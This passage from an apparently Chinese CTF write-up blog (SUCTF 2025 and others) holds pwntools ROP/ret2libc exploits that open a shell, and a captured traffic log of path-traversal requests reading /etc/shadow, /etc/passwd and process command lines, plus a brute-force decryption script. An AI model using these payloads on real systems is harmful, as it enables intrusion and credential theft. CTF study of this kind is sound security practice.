p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br><span class="hljs-comment">#puts(bss)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(puts_plt)<br>p.recvuntil(<span class="hljs-string">&quot;can you did it?&quot;</span>)<br>p.send(payload)<br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(<span class="hljs-string">b&#x27;./flag&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="å®‡å®™å°„çº¿"><a href="#å®‡å®™å°„çº¿" class="headerlink" title="å®‡å®™å°„çº¿"></a>å®‡å®™å°„çº¿</h2><p>æ²¡åšå‡ºæ¥ï¼Œå¤ç°ä¸€ä¸‹</p><p>main å‡½æ•°ï¼Œæ‰“å¼€äº†ä¸€ä¸ª&#x2F;proc&#x2F;self&#x2F;mem æ–‡ä»¶ï¼Œé€šè¿‡è¯¥æ–‡ä»¶ï¼Œå¯ä»¥è¯»å–æˆ–å†™å…¥è¿›ç¨‹çš„å†…å­˜ã€‚ç¬¬ä¸€ä¸ªè¾“å…¥æç¤ºç”¨æˆ·è¾“å…¥ä¸€ä¸ªåå…­è¿›åˆ¶æ ¼å¼çš„å†…å­˜åœ°å€ï¼Œç„¶å&#x2F;proc&#x2F;self&#x2F;mem æ–‡ä»¶ä¼šæ ¹æ®è¾“å…¥çš„å†…å­˜åœ°å€è¿›è¡Œä¿®æ”¹ã€‚è¿™é‡Œæˆ‘ä»¬è¿˜å¯ä»¥æ³¨æ„åˆ°ï¼Œ&#x2F;proc&#x2F;self&#x2F;mem æ–‡ä»¶å…³é—­åæœ‰ä¸€ä¸ª sys_exit çš„ç³»ç»Ÿè°ƒç”¨</p><img src="/post/2004/1737214753133-7b127ee4-5ab9-43f0-8f99-f5bf328f47dc.png" class="" title="img"><img src="/post/2004/1737215596633-ad054702-4694-441c-b7a3-5f86f8f72437.png" class="" title="img"><p>æŸ¥çœ‹å…¶æ±‡ç¼–ä»£ç ï¼Œå°† mov rax, 3Ch æ”¹æˆ mov rax, 0 å°±æ˜¯å¯ä»¥ç³»ç»Ÿè°ƒç”¨ readï¼Œä»è€Œè¿›è¡Œæº¢å‡º</p><img src="/post/2004/1737214157215-93558cf3-46e7-4e3c-b564-dedda940a747.png" class="" title="img"><p>æŸ¥æ‰¾ gadget çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰å‘ç° rdi çš„ gadget çš„ï¼Œä¸è¿‡ key å‡½æ•°ç»™å‡ºäº†ä¸€æ®µ gadgetï¼Œé€šè¿‡è¿™æ®µ gadget å¯ä»¥æ§åˆ¶ rdi</p><img src="/post/2004/1737213992448-e8191d83-a2a4-4b02-a964-fb86d26f709e.png" class="" title="img"><p>æ€»çš„æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡&#x2F;proc&#x2F;self&#x2F;mem æ–‡ä»¶å°†ä»£ç æ®µçš„ sys_exit ç³»ç»Ÿè°ƒç”¨æ”¹ä¸º readï¼Œå®é™…ä¸Šå°±æ˜¯ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥åœ°å€ä»è€Œæ‰¾åˆ°ä¿®æ”¹ç‚¹ï¼Œç¬¬äºŒæ¬¡è¾“å…¥ 0 å°† 3Ch æ”¹æˆ 0 å³å¯å®ç° mov rax 0ï¼› æœ‰äº†æº¢å‡ºç‚¹ä¹‹åæ‰“ ret2libc å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;101.43.67.25&#x27;</span>, <span class="hljs-number">8090</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x401309</span><br>mov_rdi_rbp_pop_rbp = <span class="hljs-number">0x40129E</span><br>pop_rbp = <span class="hljs-number">0x4012A2</span><br>ret = <span class="hljs-number">0x40101a</span><br><br><span class="hljs-comment"># attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;Enter the coordinates of the cosmic rays:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x40155F</span>+<span class="hljs-number">3</span>).encode())<br>p.recvuntil(<span class="hljs-string">&quot;Enter the data sent:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;0x0&#x27;</span>)<span class="hljs-comment">#rax -&gt; 0</span><br><br><span class="hljs-comment"># attach(p)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x12</span>+<span class="hljs-number">8</span>) + p64(pop_rbp) + p64(puts_got)<br>payload += p64(mov_rdi_rbp_pop_rbp) + p64(<span class="hljs-number">0x0</span>) + p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi; ret&#x27;</span>)))<br><br>p.recvuntil(<span class="hljs-string">&quot;Enter the coordinates of the cosmic rays:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x40155F</span>+<span class="hljs-number">3</span>).encode())<br>p.recvuntil(<span class="hljs-string">&quot;Enter the data sent:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;0x0&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x12</span>+<span class="hljs-number">8</span>) + p64(pop_rdi) + p64(binsh)<br>payload += p64(ret) + p64(system)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF 2025</title>
    <link href="/post/23605.html"/>
    <url>/post/23605.html</url>
    
    <content type="html"><![CDATA[<p>SU_checkinå’ŒSU_BBREè¿™ä¸¤é¢˜éƒ½å‡ºäº†å¤§åŠï¼Œä½†è¿˜æ˜¯å·®äº†ç‚¹ï¼Œå‚è€ƒwpæ¥å¤ç°ä¸€ä¸‹ï¼ŒPwné¢˜ç­‰æœ‰æ—¶é—´ä¹Ÿå¤ç°ä¸€ä¸‹ã€‚</p><h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SU-RealCheckin"><a href="#SU-RealCheckin" class="headerlink" title="SU_RealCheckin"></a>SU_RealCheckin</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hello ctf -&gt; ğŸ  ğŸ¦…ğŸ‹ğŸ‹ğŸŠ ğŸˆğŸŒ®ğŸŸ<br><br><span class="hljs-variable">$flag</span> -&gt; ğŸâ˜‚ï¸ğŸˆğŸŒ®ğŸŸ&#123;ğŸ‹ğŸ¦…ğŸ‹ğŸˆğŸŠğŸ”ï¸ğŸ¦…<span class="hljs-literal">_</span>ğŸŒ®ğŸŠ<span class="hljs-literal">_</span>ğŸâ˜‚ï¸ğŸˆğŸŒ®ğŸŸ<span class="hljs-literal">_</span>ğŸ§¶ğŸŠâ˜‚ï¸<span class="hljs-literal">_</span>ğŸˆğŸğŸŒƒ<span class="hljs-literal">_</span>ğŸŒˆğŸ¦…ğŸğŸ‹ğŸ‹ğŸ§¶<span class="hljs-literal">_</span>ğŸ¬ğŸğŸŒƒğŸˆğŸ¦…&#125;<br></code></pre></td></tr></table></figure><p>ä»”ç»†è§‚å¯Ÿå‘ç° flag æ˜¯æ¯ä¸ªå›¾æ ‡çš„é¦–å­—æ¯</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs clean">ğŸ-&gt;snake   -&gt;s<br>â˜‚ï¸-&gt;umbrella-&gt;u<br>ğŸˆ-&gt;cat     -&gt;c<br>ğŸŒ®-&gt;taco    -&gt;t<br>ğŸŸ-&gt;fry     -&gt;f<br>ğŸ‹-&gt;whale   -&gt;w<br>ğŸ¦…-&gt;eagel   -&gt;e<br>ğŸ‹-&gt;lemon   -&gt;l<br>...<br>ğŸŠ-&gt;orange  -&gt;o<br>ğŸ”ï¸-&gt;mountain-&gt;m<br>...<br>ğŸ§¶-&gt;yarn    -&gt;y<br>...<br>ğŸ-&gt;apple   -&gt;a<br>ğŸŒƒ-&gt;night   -&gt;n<br>...<br>ğŸŒˆ-&gt;rainbow -&gt;r<br>...<br>ğŸ¬-&gt;dolphin -&gt;d<br><br>suctf&#123;welcome_to_suctf_you_can_really_dance&#125;<br></code></pre></td></tr></table></figure><h3 id="SU-checkin"><a href="#SU-checkin" class="headerlink" title="SU_checkin"></a>SU_checkin</h3><p>æµé‡åˆ†æï¼Œç›´æ¥æœç´¢ flagï¼Œè¿½è¸ªä¸€ä¸‹å°±å¯ä»¥å‘ç°ä¿¡æ¯</p><img src="/post/23605/1736861813849-405cfc67-fc71-4729-a694-9a463e5ee69e.png" class="" title="img"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /download?filename=../../../../../../../../../root/flag.txt HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../root/flag.txt&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 7<br>Date: Thu, 09 Jan 2025 06:59:21 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>nonono<br>GET /download?filename=../../../../../../../../../proc/self/cmdline HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../proc/self/cmdline&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 65<br>Date: Thu, 09 Jan 2025 06:59:26 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>java.-jar.suctf-0.0.1-SNAPSHOT.jar.--password=SePassWordLen23SUCTGET /download?filename=../../../../../../../../../root/start.sh HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../root/start.sh&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 1<br>Date: Thu, 09 Jan 2025 06:59:32 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br><br>GET /download?filename=../../../../../../../../../proc/self/cwd/BOOT-INF/classes/hint HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../proc/self/cwd/BOOT-INF/classes/hint&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 27<br>Date: Thu, 09 Jan 2025 06:59:38 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>algorithm=PBEWithMD5AndDES<br>GET /download?filename=../../../../../../../../../etc/shadow HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../etc/shadow&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 909<br>Date: Thu, 09 Jan 2025 06:59:43 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>root:$6$MI.uuGSS7qKn4rEK$NlYB/kaAeRmd3CYY4mxDuMMMh1PzQZHTEL.BV3Dosp.15kD3MgSDzqbYRRazeglIRVAfe6ATwRZ9ekSwNTkit0:20077:0:99999:7:::<br>daemon:*:20007:0:99999:7:::<br>bin:*:20007:0:99999:7:::<br>sys:*:20007:0:99999:7:::<br>sync:*:20007:0:99999:7:::<br>games:*:20007:0:99999:7:::<br>man:*:20007:0:99999:7:::<br>lp:*:20007:0:99999:7:::<br>mail:*:20007:0:99999:7:::<br>news:*:20007:0:99999:7:::<br>uucp:*:20007:0:99999:7:::<br>proxy:*:20007:0:99999:7:::<br>www-data:*:20007:0:99999:7:::<br>backup:*:20007:0:99999:7:::<br>list:*:20007:0:99999:7:::<br>irc:*:20007:0:99999:7:::<br>gnats:*:20007:0:99999:7:::<br>nobody:*:20007:0:99999:7:::<br>_apt:*:20007:0:99999:7:::<br>systemd-timesync:*:20077:0:99999:7:::<br>systemd-network:*:20077:0:99999:7:::<br>systemd-resolve:*:20077:0:99999:7:::<br>messagebus:*:20077:0:99999:7:::<br>sshd:*:20077:0:99999:7:::<br>hacker:$6$rzdplO02wm/607Io$v9gjdKBiuEdA0F28qx1REs/L4Qo9dqBQD.fUUjans5qn/sWOjSffHWzlMvgwzxHyyrfSA8kLilzMMRGhRNHLk0:20077:0:99999:7:::<br>GET /download?filename=../../../../../../../../../proc/self/cwd/BOOT-INF/classes/application.properties HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../proc/self/cwd/BOOT-INF/classes/application.properties&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 133<br>Date: Thu, 09 Jan 2025 06:59:47 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>spring.application.name=suctf<br>server.port = 8888<br>OUTPUT=ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=<br>GET /download?filename=../../../../../../../../../etc/passwd HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../etc/passwd&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 1322<br>Date: Thu, 09 Jan 2025 06:59:53 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:104:106::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>hacker:x:1000:1000::/home/hacker:/bin/bash<br></code></pre></td></tr></table></figure><p>ç»¼åˆä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ª flag.txtï¼Œä½†æ˜¯æ²¡æœ‰ flagï¼›è¿˜æœ‰ä¸€ä¸ª hint æ˜¯PBEWithMD5AndDES ç®—æ³•ï¼Œå¯†æ–‡å’Œå¯†ç ä¹Ÿå¯çœ‹å‡ºæ¥ï¼Œå¯†æ–‡æ˜¯ OUTPUT çš„å†…å®¹ï¼Œå¯†ç åœ¨ cmdline ä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">OUTPUT=ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=<br>password=SePassWordLen23SUCT<br><br>algorithm=PBEWithMD5AndDES<br></code></pre></td></tr></table></figure><p>å½“æ—¶æƒ³ç€æ˜¯PBEWithMD5AndDES ç®—æ³•ï¼Œç„¶åå»æ‰¾è„šæœ¬â€¦å°±å¡ä½äº†ã€‚å®é™…ä¸Š password æ˜¯ 23 ä½ï¼Œä½†æ˜¯åªç»™å‡ºäº† 19 ä½ï¼Œæ‰€ä»¥éœ€è¦çˆ†ç ´4ä½å¯†ç ï¼ˆå¯ä»¥çŒœä¸€ä¸ª Fï¼Œç„¶åå˜æˆçˆ†ç ´3ä½ï¼‰ã€‚</p><p>å€Ÿç”¨ä¸€ä¸‹ S1uM4i æˆ˜é˜Ÿçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br>password = <span class="hljs-string">b&quot;SePassWordLen23SUCTF&quot;</span><br><br>OUTPUT = <span class="hljs-string">b&quot;ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=&quot;</span><br>alphabet = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_-&quot;</span><br>enc = b64decode(OUTPUT)<br><br>salt = enc[:<span class="hljs-number">8</span>]<br>enc = enc[<span class="hljs-number">8</span>:]<br>s = product(alphabet, repeat=<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">for</span> a, b, c <span class="hljs-keyword">in</span> tqdm(s):<br>    key = password + (a+b+c).encode() + salt<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>        key = md5(key).digest()<br>    cipher = DES.new(key[:<span class="hljs-number">8</span>], DES.MODE_CBC, iv = key[<span class="hljs-number">8</span>:])<br>    dec = cipher.decrypt(enc)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;SUCTF&#123;&#x27;</span> <span class="hljs-keyword">in</span> dec <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;suctf&#123;&#x27;</span> <span class="hljs-keyword">in</span> dec:<br>        <span class="hljs-built_in">print</span>(dec)<br>        <span class="hljs-built_in">print</span>(a+b+c)<br>        